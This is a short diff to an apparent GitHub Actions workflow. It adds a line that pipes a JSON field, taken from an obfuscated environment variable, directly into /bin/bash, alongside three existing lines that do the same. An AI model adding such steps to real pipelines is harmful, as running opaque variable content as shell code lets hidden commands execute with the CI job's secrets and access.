@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$nk1" | jq -r .kjiuj31606 | /bin/bash
           printf '%s' "$vwts457" | jq -r .li66358 | /bin/bash
           printf '%s' "$w11267" | jq -r .u84 | /bin/bash
+          echo $ao750 | jq -r .odga12 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
